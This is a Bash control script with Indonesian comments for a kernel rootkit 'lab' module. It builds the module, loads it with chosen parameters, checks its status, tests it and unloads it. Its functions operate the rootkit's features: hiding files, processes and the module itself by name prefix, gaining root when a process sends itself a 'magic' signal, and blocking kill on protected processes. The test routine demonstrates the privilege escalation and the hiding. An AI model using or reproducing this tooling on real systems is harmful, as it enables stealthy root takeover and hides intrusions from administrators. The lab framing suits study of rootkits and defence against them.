#!/usr/bin/env bash
# rk.sh — kontrol interaktif rootkit lab (ftrace, kernel 6.8).
#
#   ./rk.sh              menu interaktif (atau: ./rk.sh --menu)
#   ./rk.sh build        compile modul (tak butuh root)
#   ./rk.sh load         insmod (tanya param dulu bila interaktif)
#   ./rk.sh status       lsmod + sysfs + dmesg ringkas
#   ./rk.sh test         uji hide-file + privesc (non-destruktif)
#   ./rk.sh unhide       kirim sinyal unhide (wajib sebelum unload)
#   ./rk.sh unload       unhide (bila perlu) + rmmod + bersih test file
#
# Uji di VPS, JANGAN di lokal. Butuh root untuk load/unload (via sudo).
set -u
cd "$(dirname "$0")"

KO="rootkit.ko"
DEF_PREFIX="rk_"
DEF_MAGIC=64
DEF_UNHIDE=63

SUDO=""
[ "$(id -u)" = "0" ] || { command -v sudo >/dev/null && SUDO="sudo"; }

need_root() {
  if [ "$(id -u)" != "0" ] && [ -z "$SUDO" ]; then
    echo "butuh root/sudo untuk '$1'"; return 1
  fi
}

loaded() { lsmod | grep -q "^rootkit "; }

do_build() {
  echo "[rk] kernel: $(uname -r)"
  make || { echo "[rk] BUILD GAGAL"; return 1; }
  echo "[rk] build OK: $KO"
}

# Param bisa dioverride via env: PREFIX= MAGIC= UNHIDE= HIDEMOD=
do_load() {
  need_root load || return 1
  if loaded; then echo "[rk] modul sudah loaded"; return 0; fi
  [ -f "$KO" ] || { echo "[rk] $KO tidak ada — ./rk.sh build dulu"; return 1; }
  local prefix="${PREFIX:-$DEF_PREFIX}" magic="${MAGIC:-$DEF_MAGIC}"
  local unhide="${UNHIDE:-$DEF_UNHIDE}" hidemod="${HIDEMOD:-1}"
  if [ -t 0 ]; then
    read -rp "hide prefix [$prefix]: " v; [ -n "${v:-}" ] && prefix="$v"
    read -rp "magic signal 1-64 [$magic]: " v; [ -n "${v:-}" ] && magic="$v"
    read -rp "unhide signal 1-64 [$unhide]: " v; [ -n "${v:-}" ] && unhide="$v"
    read -rp "hide module 0/1 [$hidemod]: " v; [ -n "${v:-}" ] && hidemod="$v"
  fi
  $SUDO insmod "$KO" hide_prefix="$prefix" proc_prefix="$prefix" \
    sig_magic="$magic" sig_unhide="$unhide" hide_module="$hidemod" || return 1
  # simpan param efektif untuk test/unhide berikutnya
  printf '%s\n%s\n%s\n' "$prefix" "$magic" "$unhide" > .rk_params
  echo "[rk] loaded (prefix=$prefix magic=$magic unhide=$unhide hidemod=$hidemod)"
}

saved_param() { # $1 = nomor baris 1..3
  [ -f .rk_params ] && sed -n "${1}p" .rk_params || case "$1" in
    1) echo "$DEF_PREFIX";; 2) echo "$DEF_MAGIC";; *) echo "$DEF_UNHIDE";; esac
}

do_status() {
  echo "--- lsmod:"; (lsmod | grep -E "^rootkit |^Module" || echo "(rootkit tidak terlihat — hidden atau belum load)")
  echo "--- /sys/module:"; (ls /sys/module | grep -x rootkit || echo "(tidak terlihat)")
  echo "--- dmesg [rk]:"; ($SUDO dmesg 2>/dev/null | grep '\[rk\]' | tail -n 6 || echo "(dmesg tak bisa dibaca)")
}

do_test() {
  local prefix magic
  prefix="$(saved_param 1)"; magic="$(saved_param 2)"
  echo "[1] hide-file (prefix=$prefix)"
  touch "/tmp/${prefix}tikus" /tmp/rkcheck_normal
  if ls /tmp | grep -q "$prefix"; then echo "  GAGAL: $prefix masih terlihat"; else echo "  OK: $prefix tersembunyi"; fi
  if ls /tmp | grep -q rkcheck_normal; then echo "  OK: file normal terlihat"; else echo "  GAGAL: file normal ikut hilang!"; fi
  echo "[2] privesc (signal $magic)"
  if [ "$(bash -c "kill -$magic \$\$; id -u" 2>/dev/null)" = "0" ]; then
    echo "  OK: id -u = 0 (root)"
  else echo "  GAGAL: privesc tidak jalan (modul loaded? sinyal benar?)"; fi
  echo "[3] anti-kill (prefix=$prefix)"
  cp /bin/sleep "/tmp/${prefix}sleep" 2>/dev/null
  "/tmp/${prefix}sleep" 60 </dev/null >/dev/null 2>&1 &
  local p=$!
  sleep 1
  if kill -9 "$p" 2>/dev/null; then echo "  GAGAL: proses proteksi bisa di-kill"; else echo "  OK: kill ditolak (EPERM)"; fi
  kill -9 "$p" 2>/dev/null; wait "$p" 2>/dev/null
  rm -f "/tmp/${prefix}tikus" /tmp/rkcheck_normal "/tmp/${prefix}sleep"
}

do_unhide() {
  need_root unhide || return 1
  local unhide; unhide="$(saved_param 3)"
  kill "-$unhide" 1 2>/dev/null && echo "[rk] sinyal unhide ($unhide) terkirim" || echo "[rk] sinyal gagal (modul belum load?)"
  sleep 1
  loaded && echo "[rk] modul terlihat lagi" || echo "[rk] modul masih hidden / belum load"
}

do_unload() {
  need_root unload || return 1
  if ! loaded; then
    echo "[rk] lsmod tidak melihat modul — coba unhide dulu otomatis..."
    do_unhide
  fi
  if loaded; then
    $SUDO rmmod rootkit && echo "[rk] unloaded OK" || { echo "[rk] rmmod GAGAL"; return 1; }
  else
    echo "[rk] modul tidak loaded — tidak ada yang di-unload"
  fi
  rm -f .rk_params
}

menu() {
  while true; do
    echo; echo "=== rk.sh : rootkit lab ($(loaded && echo LOADED || echo UNLOADED)) ==="
    echo " 1) build    2) load     3) status   4) test"
    echo " 5) unhide   6) unload   0) keluar"
    read -rp "pilih [0-6]: " c
    case "$c" in
      1) do_build;; 2) do_load;; 3) do_status;; 4) do_test;;
      5) do_unhide;; 6) do_unload;; 0) break;; *) echo "pilihan?";;
    esac
  done
}

case "${1:-}" in
  "") [ -t 0 ] && menu || { echo "stdin bukan TTY — pakai: $0 {build|load|status|test|unhide|unload}"; exit 1; };;
  --menu) menu;;
  build) do_build;; load) do_load;; status) do_status;;
  test) do_test;; unhide) do_unhide;; unload) do_unload;;
  *) echo "pakai: $0 [--menu|build|load|status|test|unhide|unload]"; exit 1;;
esac
